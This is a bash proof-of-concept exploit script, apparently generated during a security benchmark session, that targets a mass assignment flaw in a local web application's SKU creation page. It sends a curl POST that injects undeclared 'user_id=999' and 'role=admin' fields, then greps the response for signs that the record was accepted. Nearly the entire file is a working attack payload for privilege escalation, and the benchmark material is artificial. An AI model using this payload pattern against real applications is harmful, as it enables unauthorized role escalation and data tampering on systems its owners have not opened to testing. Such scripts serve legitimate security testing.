#!/bin/bash
# POC: Improved POC demonstrating mass assignment vulnerability with verbose output capture
# Target: ./repo
# Created: 2025-12-01T15:51:20.014Z
# Session: benchmark-XBEN-092-24-minbdcli

# Mass Assignment Vulnerability POC - Improved Version
# Demonstrates parameter injection of hidden fields in SKU creation form

TARGET_URL="http://localhost:8081/sku_add.php"

echo "[*] Mass Assignment POC - SKU Creation Hidden Parameter Injection"
echo "[*] Target: $TARGET_URL"
echo ""

# Test with verbose output and full HTTP response headers
echo "[+] Test: Inject hidden 'user_id' and 'role' parameters"
echo "Sending POST request with undeclared parameters..."
echo ""

# Send request and capture full response with headers
RESPONSE=$(curl -v -X POST "$TARGET_URL" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'sku=SKU_ADMIN&name=Admin_Created&description=Test&user_id=999&role=admin' 2>&1)

echo "$RESPONSE"
echo ""
echo "[*] Response Analysis:"

# Check for success indicators
if echo "$RESPONSE" | grep -qi "200 OK\|HTTP/1.1 200"; then
  echo "[!] SUCCESS: HTTP 200 response received"
fi

if echo "$RESPONSE" | grep -qi "Record.*created\|created successfully"; then
  echo "[!] VULNERABLE: Parameters accepted - record created successfully"
fi

if echo "$RESPONSE" | grep -qi "Record [0-9]"; then
  echo "[!] VULNERABLE: Database record created"
  RECORD_ID=$(echo "$RESPONSE" | grep -oP "Record \K[0-9]+")
  echo "    Record ID: $RECORD_ID"
fi

# Verify the injected parameters were not rejected
if ! echo "$RESPONSE" | grep -qi "error\|invalid\|rejected\|not allowed"; then
  echo "[!] VULNERABLE: No validation error for injected parameters"
  echo "[!] Parameters user_id=999 and role=admin were accepted without validation"
fi

echo ""
echo "[*] Conclusion:"
echo "If HTTP 200 was returned and record was created, the mass assignment vulnerability is confirmed."
echo "The application accepted hidden parameters (user_id, role) that are not declared in the HTML form."